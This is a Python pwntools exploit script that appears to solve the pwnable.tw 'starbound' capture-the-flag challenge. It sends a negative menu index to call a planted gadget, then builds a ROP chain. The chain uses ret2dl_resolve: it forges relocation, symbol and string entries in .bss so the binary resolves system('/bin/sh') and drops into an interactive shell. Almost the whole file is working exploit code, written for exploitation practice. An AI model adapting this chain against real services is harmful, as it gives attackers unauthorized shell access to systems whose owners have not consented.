from pwn import *
import pdb

p = remote('chall.pwnable.tw', 10202)
# p = process('/home/len/pwnable/starbound.bak')


def set_name(name):
    p.sendlineafter('> ', '6')
    p.sendlineafter('> ', '2')
    p.sendlineafter('Enter your name: ', name)
    p.sendlineafter('> ', '1')


def trigger(payload):
    p.sendlineafter('> ', payload)


elf = ELF('/home/len/pwnable/starbound.bak')

context.proxy = {
    'http_proxy': 'http://192.168.152.1:19999',
    'https_proxy': 'http://192.168.152.1:19999'
}

bss_stage = 0x8057D90
REL_PLT_ADDR = elf.get_section_by_name('.rel.plt').header.sh_addr  #
SYMTAB_ADDR = elf.get_section_by_name('.dynsym').header.sh_addr  #
STRTAB_ADDR = elf.get_section_by_name('.dynstr').header.sh_addr  #

read_plt_addr = elf.plt['read']
read_got_addr = elf.got['read']

fake_str_addr = bss_stage
fake_str = 'system\x00/bin/sh'.ljust(16, chr(0))
binsh_addr = fake_str_addr + 7
fake_str_offset = fake_str_addr - STRTAB_ADDR  # system

fake_rel_addr = fake_str_addr + 0x10 + 0x8
fake_rel_offset = fake_rel_addr - REL_PLT_ADDR

fake_symbol_addr = fake_rel_addr + 0x8 + 0xc
fake_symbol_offset = fake_symbol_addr - SYMTAB_ADDR
fake_symbol_index = fake_symbol_offset / 0x10

fake_rel_info = fake_symbol_index << 8 | 7
fake_rel = p32(read_got_addr) + p32(fake_rel_info)
fake_symbol = p32(fake_str_offset) + p32(0) * 2 + p32(0X12)

context.log_level = 'info'

add_esp_gadget = 0x8048e48
ppp_ret_addr = 0x080494da
ret_dl_resolve = 0x804895B

if __name__ == "__main__":
    set_name(p32(add_esp_gadget))

    log.info("REL_PLT_ADDR: {:#x}".format(REL_PLT_ADDR))
    log.info("SYMTAB_ADDR: {:#x}".format(SYMTAB_ADDR))
    log.info("STRTAB_ADDR: {:#x}".format(STRTAB_ADDR))

    log.info("fake_rel_addr: {:#x}".format(fake_rel_addr))
    log.info("fake_symbol_addr: {:#x}".format(fake_symbol_addr))
    log.info("fake_str_addr: {:#x}".format(fake_str_addr))

    log.info("fake_rel_offset: {:#x}".format(fake_rel_offset))
    log.info("fake_symbol_offset: {:#x}".format(fake_symbol_offset))
    log.info("fake_str_offset: {:#x}".format(fake_str_offset))

    payload = str(-33) + '\x00' + 'a' * 4 + p32(read_plt_addr) + p32(
        ppp_ret_addr) + p32(0) + p32(bss_stage) + p32(0x200)

    payload += p32(ret_dl_resolve) + p32(fake_rel_offset) + p32(binsh_addr)*2

    pdb.set_trace()
    trigger(payload)

    payload = fake_str + p32(0) * 2 + fake_rel + p32(
        0) * 3 + fake_symbol + p32(0)

    pdb.set_trace()
    p.sendline(payload)

    p.interactive()
